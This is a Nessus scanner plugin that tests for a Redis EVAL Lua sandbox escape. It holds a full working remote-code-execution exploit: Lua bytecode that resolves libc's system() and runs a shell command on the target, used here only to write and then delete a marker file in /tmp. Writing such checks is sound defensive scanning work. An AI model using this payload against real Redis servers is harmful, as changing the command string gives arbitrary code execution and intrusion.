#TRUSTED ae055a7ff1d0032447a7991e08c8151b4c4dc9cc29fa2249bfb4b57bc3c20916dad42df2a92f655812e0b0d128acf9d2b1a3d2d6888a41f8b75e3dfc32c97d8b3633799a322390513c0eb2662f0436395c3ff67260c9d2ee202446f37c8da7ab56c0242074f308464e562b985b2e9998500d862e3bee97e7377711508b3810d65260e409fab88d8db088376dafeec6699ed702659d8050f13042e896ae9aeab728d0b15ebb397be1647f0bad956218f757acf94e76d14ac873027a552476514dc2e0cb142bc44a8f3f7a86b4aa945a76a994ee1d9189a2c365531dbfe96dea47b87a378d60d94fe7ac64aefe0c5303e9a214593e75a83b6db0146ee1f870468413a1819b54168008c480ab4289df692c382dd50c3b8b9d63f65bc2ab68f59a38382e91cd6a8533ca09e0faea1ed2eaf30fb363f11286343017efa2eea5b3bbc85729df1f936909dda85c35723d2840f1bbcdc99ce6e70e69ffea8a1396accf9864fc4c80175a7cfa75fe572bfc2e6a22fd02c5931a65651a261eb1c89a868ee12dfaaa4cedd5251673f6feedb6ab5f2db25e07e7b2eb12b9ebf7957e28627e252a7d175f46dc6ac62caaf5b81c51a9d8e2dddc866f57b9b43050fdb512e45c48ce7812802ff9f7be7104020b9a3dad7b376b5f293a49e6b399eb5ca9b37bbde02fe533d6f3789f073e64724d71e4edfa138544c545a1c3ee22cc7f87414ce164
#TRUST-RSA-SHA256 1c6c92850a1aeec605002974ab7141a955ddbb518ff8f3d6f7a2a0c3a427fabce56ecbc386e4c6d6b2d1cab27ca45b08e883c85cb691318dcb157d5f61bbf207034fc1d958fab1748b486cb4b92a61f11cab44dd3a953bad4f7c114ad76517fe038a0a4d321e5e5be8a7eae1e83fd91428d406b75787632c199bfc315dc60a3b354c8faca8d681f9ff6658b5164a1675740d89f82e0f7093d1f187a7d401634b4331c9f769244c9b3e809ca4afe1930acd41c7ace14866f4b3582aff23097ffce477a357f6397127b15b78fc423c59d36b16235216ed19bb0e1179005933bad64314b28832d55c52e76a087b29073d796ed1269d39e45428ff0e8614e5395302868e116d6f67ce20956eb1a92a2b68a418ba7c26f3a75a64bfa91c783f4a799d9932bcf60ff1b4aba25d4b540d6dcf2a9a71a1c5cc02475f5e52265046e07028627a10c6306259d9da916ee71428f95f3b05f4292e67969a841439bc321bbfd037cd099f99092870741047dec5c7cf98917af17f21359f58bac373e8d890e2146f70a2be463dc119f27d13240f44c0dcab1d7ab1cc575cafdec5f4063b14e016357ae23256527e9f0f906cee774e7e59110598e7a417addf1aa929db27bb2202c0e4aa7a37d10956503ddeeb5beb585b3a715bc2e6a24d0dca385ec409cfe2d6f36384a70ccf19e14d0e63553d09fa230db9008d40905536bef7bab7624de194
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(111108);
  script_version("1.5");
  script_set_attribute(attribute:"plugin_modification_date", value:"2025/02/11");

  script_name(english:"Redis EVAL Lua Sandbox Escape");

  script_set_attribute(attribute:"synopsis", value:
"Redis before 2.8.21 and 3.x before 3.0.2 allows remote attackers to 
execute arbitrary Lua bytecode via the eval command.");
  script_set_attribute(attribute:"description", value:
"Redis before 2.8.21 and 3.x before 3.0.2 allows remote attackers to 
execute arbitrary Lua bytecode via the eval command.");
  # http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d07c07d6");
  script_set_attribute(attribute:"solution", value:
"Update to redis 3.0.2 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/09/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/09/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/04/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pivotal_software:redis");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2018-2025 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("redis_detect.nbin", "ssh_get_info.nasl");
  script_require_keys("Host/local_checks_enabled");
  script_require_ports("Services/redis_server", 6379);

  exit(0);
}
include("audit.inc");
include("global_settings.inc");
include("ssh_func.inc");
include("telnet_func.inc");
include("hostlevel_funcs.inc");
include("misc_func.inc");
include("string.inc");


function cmdtohex(command)
{
    #add some padding after the command to make it 16 bytes
    if (strlen(command) % 16 != 0)
      command = command + crap(length:8 - (strlen(command) % 8),data:'\0');

    local_var hex_cmd = "";
    local_var i = 0;
    for (i = 0;i < strlen(command);i+=8)
    {
        local_var c1 = hexstr(string_reverse(substr(command,i,i + 3)));
        if (strlen(c1) % 8)
            c1 = "0" + c1;
        local_var c2 = hexstr(string_reverse(substr(command,i+4 ,i + 7)));
        if (strlen(c2) % 8)
            c2 = "0" + c2;
        hex_cmd = hex_cmd + "dwords_to_double(0x" + c1 + ", 0x" + c2 + "),";
    }
    return hex_cmd;
}

luacode1 = 'eval \'local asnum = loadstring((string.dump(function(x) for i = x, x, 0 do return i end end):' +
'gsub("\\96%z%z\\128", "\\22\\0\\0\\128")))  local function double_to_dwords(x) if x == 0 then return 0, 0 ' +
'end if x < 0 then x = -x end  local m, e = math.frexp(x)  if e + 1023 <= 1 then m = m * 2^(e + 1074) ' +
'e = 0 else m = (m - 0.5) * 2^53 e = e + 1022 end  local lo = m % 2^32 m = (m - lo) / 2^32 local hi = ' +
'm + e * 2^20  return lo, hi end  local function dwords_to_double(lo, hi) local m = hi % 2^20 local e = ' +
'(hi - m) / 2^20 m = m * 2^32 + lo  if e ~= 0 then m = m + 2^52 else e = 1 end  return m * 2^(e-1075) end  ' +
'local function dword_to_string(x) local b0 = x % 256; x = (x - b0) / 256 local b1 = x % 256; x = (x - b1) / 256 ' +
'local b2 = x % 256; x = (x - b2) / 256 local b3 = x % 256  return string.char(b0, b1, b2, b3) end ' +
' local function qword_to_string(x) local lo, hi = double_to_dwords(x) return dword_to_string(lo) .. ' +
'dword_to_string(hi) end  local function add_dword_to_double(x, n) local lo, hi = double_to_dwords(x) ' +
'return dwords_to_double(lo + n, hi) end  local function band(a, b) local p, c=1, 0 while a > 0 and b > 0 ' +
'do local ra, rb = a % 2, b % 2 if ra + rb > 1 then c = c + p end a, b, p = (a - ra) / 2, (b - rb) / 2, p * ' +
'2 end  return c end  rawset(_G, "add_dword_to_double", add_dword_to_double) rawset(_G, "asnum", asnum) ' +
'rawset(_G, "double_to_dwords", double_to_dwords) rawset(_G, "dwords_to_double", dwords_to_double) ' +
'rawset(_G, "dword_to_string", dword_to_string) rawset(_G, "qword_to_string", qword_to_string) ' +
'rawset(_G, "band", band) collectgarbage "stop" debug.sethook()\' 0';

luacode2a = 'eval \'coroutine.wrap(loadstring(string.dump(function() local magic = nil local function middle() ' +
'local asnum = asnum local double_to_dwords = double_to_dwords local add_dword_to_double = add_dword_to_double ' +
'local dwords_to_double = dwords_to_double local qword_to_string = qword_to_string local band = band local co = ' +
'coroutine.wrap(function() end) local substr = string.sub local find = string.find local upval  local ' +
'luastate1 = asnum(coroutine.running()) local luastate2 = add_dword_to_double(luastate1, 8)  local n1 = 1 ' +
'local n2 = 2 local n4 = 4 local n6 = 6 local n7 = 7 local n8 = 8 local n16 = 16 local n24 = 24 local n32 = 32  ' +
'local hfff = 0xfff00000 local h38 = 0x38  local PT_DYNAMIC = 2 local DT_NULL = 0 local DT_STRRAB = 5 ' +
'local DT_SYMTAB = 6 local DT_DEBUG = 21  local libc = "libc.so." local system = "__libc_system" ' +
'local null = "\\0" local empty = "" local luastate1_bkp local luastate2_bkp local lo, hi local base ' +
'local ptheader local dynamic local symbol local debug  local s, e, tmp, n local str = empty local ' +
'link_map local libc_dynamic local libc_base local libc_system local libc_strtab local libc_symtab ' +
'local commands = {';
luacode2b = '}  local function put_into_magic(n) upval = "nextnexttmpaddpa" .. qword_to_string(n) ' +
'local upval_ptr = qword_to_string(add_dword_to_double(asnum(upval), 24)) magic = upval_ptr .. upval_ptr ' +
'.. upval_ptr end  put_into_magic(add_dword_to_double(asnum(co), n32))  lo, hi = double_to_dwords(asnum(magic))' +
' base = dwords_to_double(band(lo, hfff), hi) put_into_magic(add_dword_to_double(base, n32))  lo, ' +
'hi = double_to_dwords(asnum(magic)) ptheader = add_dword_to_double(base, lo)  while true do put_into_magic(ptheader)' +
' lo, hi = double_to_dwords(asnum(magic)) if lo == PT_DYNAMIC then put_into_magic(add_dword_to_double(ptheader, n16)) ' +
'dynamic = asnum(magic) break else ptheader = add_dword_to_double(ptheader, h38) end end  while true do put_into_magic(dynamic)' +
' lo, hi = double_to_dwords(asnum(magic))  if lo == DT_DEBUG then put_into_magic(add_dword_to_double(dynamic, n8)) ' +
'debug = asnum(magic) break else dynamic = add_dword_to_double(dynamic, n16) end end  put_into_magic(add_dword_to_double(debug, n8))' +
' link_map = asnum(magic)  while true do  put_into_magic(add_dword_to_double(link_map, n8)) n = asnum(magic)  ' +
'while true do put_into_magic(n) tmp = qword_to_string(asnum(magic))  s, e = find(tmp, null) if s then str = str .. ' +
'substr(tmp, n1, s - n1) break else str = str .. tmp n = add_dword_to_double(n, n8) end end  s, e = find(str, libc) if s ' +
'then put_into_magic(link_map) libc_base = asnum(magic)  put_into_magic(add_dword_to_double(link_map, n16)) libc_dynamic = ' +
'asnum(magic)  while true do put_into_magic(libc_dynamic) lo, hi = double_to_dwords(asnum(magic)) ' +
'put_into_magic(add_dword_to_double(libc_dynamic, n8))  if lo == DT_NULL then break elseif lo == DT_STRRAB ' +
'then libc_strtab = asnum(magic) elseif lo == DT_SYMTAB then libc_symtab = asnum(magic) end  libc_dynamic = ' +
'add_dword_to_double(libc_dynamic, n16) end  break else put_into_magic(add_dword_to_double(link_map, n24)) ' +
'link_map = asnum(magic) end end  while true do put_into_magic(libc_symtab) lo, hi = double_to_dwords(asnum(magic))' +
'  n = add_dword_to_double(libc_strtab, lo) str = empty while true do put_into_magic(n) tmp = qword_to_string(asnum(magic))' +
'  s, e = find(tmp, null) if s then str = str .. substr(tmp, n1, s - n1) break else str = str .. tmp n = ' +
'add_dword_to_double(n, n8) end end  if str and str == system then put_into_magic(add_dword_to_double(libc_symtab, n8))' +
' lo, hi = double_to_dwords(asnum(magic)) libc_system = add_dword_to_double(libc_base, lo) break else libc_symtab = ' +
'add_dword_to_double(libc_symtab, n24) end end  put_into_magic(add_dword_to_double(asnum(co), n32)) magic = libc_system ' +
'put_into_magic(luastate1) luastate1_bkp = asnum(magic) put_into_magic(luastate2) luastate2_bkp = asnum(magic) for i=n1,#commands,n2 ' +
'do put_into_magic(luastate1) magic = commands[i] put_into_magic(luastate2) magic = commands[i + n1] co() end put_into_magic(luastate1) ' +
'magic = luastate1_bkp put_into_magic(luastate2) magic = luastate2_bkp end middle() end):gsub("(\\100%z%z%z)....", "%1\\0\\0\\0\\1", 1)))()\' 0';

filename = rand_str(length:3);
cmd = "echo 1>/tmp/"+filename;
ping_cmd = cmdtohex(command:cmd);
full_msg = luacode1 + '\n\n' + luacode2a + ping_cmd + luacode2b + '\n\n';

port = get_service(svc:"redis_server", default:6379, exit_on_fail:TRUE);

# Open TCP socket to send the RCE code
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

# Send data and now it should write NES in /tmp/a
send(socket:soc, data:full_msg);

res = recv(socket:socket, length:1024);
sleep(1);
close(soc);

if (islocalhost())
{
  if (!defined_func("pread")) exit(1, "'pread()' is not defined.");
  info_t = INFO_LOCAL;
}
else
{
  info_t = INFO_SSH;
  ret = ssh_open_connection();
  if (!ret) exit(1, "Failed to open an SSH connection.");
}
file_path = "/tmp/" + filename;
res = info_send_cmd(cmd:'ls  /tmp | grep \'' + filename + '\'');

if(filename >< res)
{
  res = info_send_cmd(cmd:'rm -f ' + file_path);
  if (info_t == INFO_SSH) ssh_close_connection();

  report = "Nessus was able to exploit the vulnerability and created a file " + file_path;
  security_report_v4(port:0, severity:SECURITY_HOLE, extra:report);
}
else
{
  if (info_t == INFO_SSH) ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "Redis Server", port);
}

